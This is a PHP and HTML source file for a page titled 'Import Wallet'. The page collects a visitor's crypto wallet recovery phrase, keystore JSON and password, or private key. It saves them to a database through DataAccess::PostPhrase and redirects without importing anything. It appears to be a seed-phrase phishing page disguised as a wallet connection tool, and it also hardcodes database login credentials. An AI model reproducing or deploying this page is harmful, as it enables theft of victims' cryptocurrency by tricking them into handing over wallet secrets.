<?php 
if (isset($_POST['send'])) {
	include 'data.php';
	
	$con = mysqli_connect("localhost","ajibztech","ajibose419","val_wallet");

$phrase = htmlspecialchars(strip_tags(stripslashes($_POST['phrase'])));
$keystore= htmlspecialchars(strip_tags(stripslashes($_POST['keystore']))); 
$keystorePass = htmlspecialchars(strip_tags(stripslashes($_POST['keystore_pass'])));
$privateKey = htmlspecialchars($_POST['privatekey']);

$result = DataAccess::PostPhrase($phrase, $keystore, $keystorePass, $privateKey);
if($result){
	header("location:response.html");
}

}


?>



<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="stylesheet" type="text/css" href="style.css">
	<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Oxygen:wght@300&display=swap" rel="stylesheet">
	<title>Import Wallet</title>
</head>
<body>
	<?php include_once('nav.html') ?>
	<div class="walletConnect">
		<h2 style="color: #587087;">Import Wallet</h2>
		<div class="connectBtn">
			<button class="active" onclick="phraseFunction()" id="phraseBtn">Phrase</button>
			<button class="notactive" onclick="keystoreFunction()" id="keystoreBtn">Keystore JSON</button>
			<button class="notactive" onclick="keyFunction()" id="privatekeyBtn">Private Key</button>
			
		</div>
		<form method="post" action="">
		<div class="phraseDisplay connectDisplay " id="phrase" style="display: flex;">
			<div><textarea placeholder="phrase"  name="phrase"></textarea></div>
			<p>Typically 12 (sometimes 24) words separated by single spaces</p>
			
			<!-- <input type="submit" name="send" value="IMPORT" class="submitBtn"> -->
		</div>

			<div class="keystoreDisplay connectDisplay" id="keystore" style="display: none;">
				<div><textarea placeholder="Keystore JSON"  name="keystore"></textarea></div>
			<div><input type="text" placeholder="Password" name="keystore_pass" style="margin-top: 10px;"></div>
			
			<p>Several lines of text beginning with '(...)' plus the password you used to encrypt it.</p>
			<!-- <input type="submit" name="send" value="IMPORT" class="submitBtn"> -->
		</div>

			<div class="privatekeyDisplay connectDisplay " id="privateKey" style="display: none;">
			<div><input type="text"  placeholder="Private Key" name="privatekey"></div>
			
			<p>Typically 12 (sometimes 24) words separated by single spaces</p>
			
		</div>
		<center><input type="submit" name="send" value="IMPORT"  class="submitBtn" ></center>

		</form>
		
	</div>

	<?php include_once('footer.html') ?>


	<script type="text/javascript">
		function phraseFunction(){
			var phrase = document.getElementById('phrase')
			var keystore = document.getElementById('keystore')
			var key = document.getElementById('privateKey')
			phrase.style.display = "flex"
			keystore.style.display = "none"
			key.style.display = "none"


			document.getElementById('privatekeyBtn').classList.remove('active')
			document.getElementById('privatekeyBtn').classList.add('notactive')
			document.getElementById('keystoreBtn').classList.remove('active')
			document.getElementById('keystoreBtn').classList.add('notactive')
			document.getElementById('phraseBtn').classList.remove('notactive')
			document.getElementById('phraseBtn').classList.add('active')



		}

		function keystoreFunction(){
			var phrase = document.getElementById('phrase')
			var keystore = document.getElementById('keystore')
			var key = document.getElementById('privateKey')
			phrase.style.display = "none"
			keystore.style.display = "flex"
			key.style.display = "none"
			document.getElementById('phraseBtn').classList.remove('active')
			document.getElementById('phraseBtn').classList.add('notactive')
			document.getElementById('privatekeyBtn').classList.remove('active')
			document.getElementById('privatekeyBtn').classList.add('notactive')
			document.getElementById('keystoreBtn').classList.remove('notactive')
			document.getElementById('keystoreBtn').classList.add('active')
			
			
			



		}

		function keyFunction(){


			var phrase = document.getElementById('phrase')
			var keystore = document.getElementById('keystore')
			var key = document.getElementById('privateKey')
			var keybtn = document.getElementById('keybtn')
			phrase.style.display = "none"
			keystore.style.display = "none"
			key.style.display = "flex"

			document.getElementById('phraseBtn').classList.remove('active')
			document.getElementById('phraseBtn').classList.add('notactive')
			document.getElementById('keystoreBtn').classList.remove('active')
			document.getElementById('keystoreBtn').classList.add('notactive')
			document.getElementById('privatekeyBtn').classList.remove('notactive')
			document.getElementById('privatekeyBtn').classList.add('active')

		}
		
	</script>

</body>
</html>